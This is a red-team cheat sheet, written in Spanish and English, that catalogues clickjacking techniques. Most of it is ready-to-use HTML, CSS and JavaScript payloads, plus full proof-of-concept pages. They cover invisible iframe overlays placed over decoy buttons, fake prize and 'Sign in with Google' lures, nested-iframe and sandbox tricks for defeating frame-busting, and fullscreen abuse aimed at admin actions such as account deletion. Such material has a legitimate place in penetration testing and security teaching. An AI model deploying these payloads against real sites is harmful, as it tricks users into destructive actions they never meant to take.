---
aliases:
  - Iframe Overlay
  - Opacity Trick
  - Decoy Button
  - Double Iframe
tags:
  - vuln/clickjacking
  - technique/initial-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Clickjacking]]"
---
# Clickjacking - Vectores Básicos

---

## Iframe Overlay con Opacity

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe src="https://target.com/admin/delete" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.0001;z-index:9999"></iframe>` | Standard opacity 0.0001 overlay | Standard CJ. |
| `<iframe src="https://target.com/x" style="opacity:0;z-index:9999"></iframe>` | Full opacity 0 invisible | Edge — events may not fire. |
| `<iframe src="https://target.com/x" style="position:absolute;top:280px;left:240px;width:120px;height:48px;opacity:0.0001;z-index:9999;pointer-events:auto"></iframe>` | Pixel-precise overlay on button | Precision targeting. |
| `<iframe src="https://target.com/x" style="position:absolute;transform:translate(240px,280px);opacity:0.0001;z-index:9999"></iframe>` | CSS transform position modern | Modern positioning. |
| `<iframe src="https://target.com/x" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);opacity:0.0001;width:400px;height:400px;z-index:9999"></iframe>` | Centered overlay responsive | Centered. |
| `<iframe src="https://target.com/x" style="opacity:0.0001;z-index:9999;width:100vw;height:100vh;position:fixed;top:0;left:0"></iframe>` | Full viewport overlay | Viewport-cover. |
| `<iframe src="https://target.com/x" style="@media (max-width:768px){opacity:0.0001;...}"></iframe>` | Mobile-specific overlay | Multi-device. |
| `<iframe src="https://target.com/x" style="opacity:0.0001;z-index:9999;animation:slide 2s"></iframe>` con `@keyframes slide` | CSS animated stealth alignment | Animated alignment. |
| Burp Repeater → check `X-Frame-Options` response header → if missing/`SAMEORIGIN`-only-on-other-origin → vulnerable | Probe X-Frame-Options pre-attack | Pre-attack probe. |
| `curl -I https://target.com/admin \| grep -iE 'x-frame-options\|content-security-policy.*frame-ancestors'` | CLI XFO/CSP frame-ancestors probe | CLI probe. |
| `nuclei -t http/misconfiguration/clickjacking.yaml -u https://target.com` | Nuclei XFO/frame-ancestors auto check | Automated. |
^cj-vector-opacity

### Standard PoC

```html
<!DOCTYPE html>
<html>
<head>
<style>
  body { margin: 0; padding: 0; }
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;
    z-index: 9999;
  }
  .decoy {
    position: absolute;
    top: 280px; left: 240px;
    z-index: 1;
    background: #4CAF50;
    color: white;
    padding: 16px 32px;
    font-size: 18px;
    font-weight: bold;
    border: none;
    border-radius: 4px;
  }
  .background {
    background: #f0f0f0;
    height: 100vh;
    text-align: center;
    padding-top: 200px;
    font-size: 32px;
  }
</style>
</head>
<body>
  <div class="background">
    <h1>You won a prize!</h1>
    <button class="decoy">CLAIM NOW</button>
  </div>
  <iframe src="https://target.com/admin/delete-account"></iframe>
</body>
</html>
```

---

## Decoy Button Placement

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Repeater → request target page → identify button via DevTools Inspector → note x/y/dimensions | Recon button precise position | Pre-attack recon. |
| `<button style="position:absolute;top:280px;left:240px;width:120px;height:48px;z-index:1">CLAIM NOW</button><iframe src="https://target.com/admin/delete" style="position:absolute;top:280px;left:240px;width:120px;height:48px;opacity:0.0001;z-index:9999"></iframe>` | Pixel-aligned decoy + iframe overlay | Precision target. |
| `<div style="display:grid;grid-template-rows:1fr 1fr 1fr"><button>Step 1</button><button>Step 2</button><button>Step 3</button></div><iframe style="opacity:0.0001;..."></iframe>` | Multi-step game-style decoy | Multi-action chain. |
| `<button style="position:absolute;top:calc(50vh - 24px);left:calc(50vw - 60px);width:120px;height:48px">CLICK</button>` | Responsive `calc()` positioning | Responsive. |
| `<button style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:48px">CLICK</button>` | Centered fixed responsive | Modern fixed center. |
| `<style>@media (max-width:768px){.decoy{top:200px;left:50%;...}}</style>` | Mobile-responsive decoy | Mobile-aware. |
| `<button style="position:absolute;animation:appear 3s forwards"><style>@keyframes appear{from{opacity:0}to{opacity:1}}</style>CLICK</button>` | Timer-revealed decoy | UX trick. |
| `<div style="font-size:50px;font-weight:bold">Click "Sign in with Google" to continue</div><button style="...">Sign in with Google</button>` | OAuth-style federation phish | Federation. |
| `<form><label>Q1: <input type=radio></label></form><button class=decoy>Submit</button>` | Survey-style decoy | Engagement. |
| Burp Repeater → identify confirm dialogs → overlay confirm Yes button | Critical confirm button overlay | High-impact. |
| `<button style="...;cursor:pointer;background:linear-gradient(...)">PLAY NOW</button>` | Game-style high-engagement decoy | High engagement. |
^cj-vector-decoy

---

## Double Iframe

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<iframe srcdoc='<iframe src=https://target.com/admin/x style=opacity:0.0001;width:100%;height:100%></iframe>' style="width:100%;height:100vh"></iframe>` | srcdoc nested iframe bypass | Frame-busting bypass. |
| `<iframe srcdoc='<iframe src=https://target.com/x style=opacity:0.0001></iframe><button style=position:absolute;top:300px;left:200px;z-index:1>Click</button>' style="width:100vw;height:100vh"></iframe>` | Outer srcdoc + inner victim + decoy | Compound nesting. |
| `<iframe sandbox="allow-forms allow-scripts" src="https://attacker.com/cj.html"></iframe>` con cj.html inside loading victim | Sandbox outer to remove frame-buster JS | Sandbox JS-strip. |
| `<iframe sandbox="allow-scripts" srcdoc='<iframe src=https://target.com/x></iframe>'></iframe>` | Sandbox + srcdoc combo | JS-strip combo. |
| `<object data="https://target.com/admin/x" style="opacity:0.0001;width:100%;height:100%;position:absolute;z-index:9999"></object>` | Object tag alt to iframe | Edge alt. |
| `<embed src="https://target.com/admin/x" style="opacity:0.0001;..."></embed>` | Embed tag alt | Embed alt. |
| `<frameset><frame src="https://target.com/admin/x" style="opacity:0.0001"></frameset>` (legacy) | Legacy frameset | Pre-iframe. |
| `<iframe src="https://target.com/x"><iframe src="https://target.com/y"></iframe></iframe>` | Multi-level nesting | Deep nesting. |
| `<iframe srcdoc='<iframe srcdoc=&quot;<iframe src=https://target.com/x></iframe>&quot;></iframe>'></iframe>` | Triple-nested escape | Edge triple. |
| `<iframe src="data:text/html,<iframe src=https://target.com/x style=opacity:0.0001></iframe>"></iframe>` | data: URL nested | data: scheme. |
^cj-vector-double-iframe

### Double iframe PoC

```html
<iframe srcdoc='
  <iframe src="https://target.com/admin/action"
          style="opacity:0.0001;width:100%;height:100%"></iframe>
  <button style="position:absolute;top:300px;left:200px;z-index:1">
    Click here
  </button>
' style="width:100%;height:100vh"></iframe>
```

---

## Fullscreen Mode Abuse

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<button onclick="document.documentElement.requestFullscreen()">Play Game</button>` luego JS overlays iframe on fullscreen | Fullscreen + post-FS overlay | UX confusion. |
| `<button onclick="fs()">Start</button><script>function fs(){document.documentElement.requestFullscreen().then(()=>{const i=document.createElement('iframe');i.src='https://target.com/admin/x';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.0001;z-index:9999';document.body.appendChild(i)})}</script>` | Auto inject iframe post-fullscreen | Fullscreen auto-overlay. |
| `<script>document.addEventListener('click',()=>{document.documentElement.requestFullscreen()},{once:true})</script>` | Any click triggers fullscreen | First-click capture. |
| `<button onclick="requestFs()">PRESS ENTER TO START</button><script>function requestFs(){document.documentElement.requestFullscreen();setTimeout(()=>{const el=document.querySelector('iframe');el.style.opacity='0.0001'},100)}</script>` | Timed opacity flip post-FS | Time-sensitive. |
| `<button onclick="picInPic()">PiP</button><script>function picInPic(){document.querySelector('video').requestPictureInPicture()}</script>` | Picture-in-picture API abuse | Niche PiP. |
| `<style>:fullscreen iframe{opacity:0.0001!important;z-index:9999!important}</style>` | CSS-only fullscreen iframe stealth | CSS auto-stealth. |
| `<button onclick="dispatchEvent(new KeyboardEvent('keydown',{key:'Tab'}))">Continue</button>` (combine con tab to iframe) | Keyboard tab to iframe button | Keyboard hijack combo. |
| Mobile: `<meta name="apple-mobile-web-app-capable" content="yes">` + fullscreen | Mobile fullscreen home-screen app | Mobile fullscreen. |
| `<script>navigator.xr.requestSession('immersive-vr').then(...)</script>` | WebXR fullscreen request | WebXR niche. |
| `<video autoplay onplay="this.requestFullscreen()"></video>` | Video onplay auto-FS | Video trigger. |
| Detect FS exit: `document.addEventListener('fullscreenchange',()=>{...})` luego ocultar iframe | Hide iframe on FS exit (stealth) | Stealth. |
^cj-vector-fullscreen

### Fullscreen overlay PoC

```html
<!DOCTYPE html>
<html>
<body>
<button onclick="goFullscreen()">Enter immersive game</button>
<script>
function goFullscreen() {
  document.documentElement.requestFullscreen();

  const iframe = document.createElement('iframe');
  iframe.src = 'https://target.com/admin/critical-action';
  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.0001;z-index:9999';
  document.body.appendChild(iframe);

  const decoy = document.createElement('div');
  const btn = document.createElement('button');
  btn.textContent = 'PRESS ENTER';
  btn.style.cssText = 'position:fixed;top:50%;left:50%;font-size:32px';
  decoy.appendChild(btn);
  document.body.appendChild(decoy);
}
</script>
</body>
</html>
```

---
